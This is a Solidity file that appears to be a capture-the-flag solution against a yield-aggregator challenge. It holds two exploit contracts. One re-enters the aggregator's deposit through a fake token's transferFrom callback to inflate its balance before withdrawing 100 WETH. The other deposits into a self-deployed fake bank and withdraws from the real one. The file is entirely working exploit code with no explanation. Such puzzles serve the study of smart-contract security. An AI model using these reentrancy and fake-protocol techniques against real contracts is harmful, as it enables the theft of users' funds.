pragma solidity ^0.8.0;

import "./Setup.sol";

contract yieldExploit {
    yieldSetup setup;
    YieldAggregator aggregator;
    WETH92 constant weth = WETH92(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Protocol protocol;

    constructor(yieldSetup _setup) payable {
        require(msg.value == 50 ether);
        setup = _setup;
        aggregator = setup.aggregator();
        protocol = Protocol(address(setup.bank()));
        // fund our wallet
        weth.deposit{value: msg.value}();
        weth.approve(address(aggregator), type(uint256).max);
        weth.approve(address(protocol), type(uint256).max);
    }

    function attack() public {
        address[] memory _tokens = new address[](1);
        _tokens[0] = address(this);

        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 100;
        aggregator.deposit(protocol, _tokens, _amounts);

        _tokens[0] = address(weth);
        _amounts[0] = 100 ether;
        aggregator.withdraw(protocol, _tokens, _amounts);
    }

    function transferFrom(
        address src,
        address dst,
        uint256 qty
    ) external returns (bool) {
        address[] memory _tokens = new address[](1);
        _tokens[0] = address(weth);

        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 50 ether;
        aggregator.deposit(protocol, _tokens, _amounts);
        return true;
    }

    function approve(
        address dst,
        uint256 qty
    ) external returns (bool) {
        return true;
    }
}

contract ExploitYieldAggregator {
    WETH92 constant weth = WETH92(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // mainnet

    constructor(address _bank, address _aggregator) payable {
        require(msg.value == 50 ether);

        weth.deposit{value: msg.value}();
        weth.approve(_aggregator, type(uint256).max);

        MiniBank exploitBank = new MiniBank();

        address[] memory _tokens = new address[](1);
        _tokens[0] = address(weth);

        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 50 ether;

        YieldAggregator aggregator = YieldAggregator(_aggregator);
        aggregator.deposit(Protocol(address(exploitBank)), _tokens, _amounts);

        _amounts[0] = 50 ether;
        aggregator.withdraw(Protocol(_bank), _tokens, _amounts);
    }
}
